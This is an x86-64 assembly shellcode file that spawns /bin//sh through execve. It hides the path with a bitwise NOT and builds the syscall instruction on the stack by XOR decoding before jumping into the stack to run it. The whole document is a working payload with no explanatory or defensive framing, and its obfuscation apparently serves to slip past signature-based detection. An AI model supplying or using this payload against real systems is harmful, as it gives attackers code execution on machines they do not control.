bits 64

section .text

global _start

_start:
	xor rax, rax
 	push rax
	xor rdx, rdx
	xor rsi, rsi
	mov rbx, 0x978cd0d091969dd0
	not rbx ;0x68732f2f6e69622f
	push rbx

	mov rdi,rsp
	mov al, 0x3b	 ; SYS_execve

	xor rbp, rbp
	mov bp, 0x7f32
	push rbp
	xor word [rsp], 0x7a3d
	jmp rsp ; exec syscall on stack
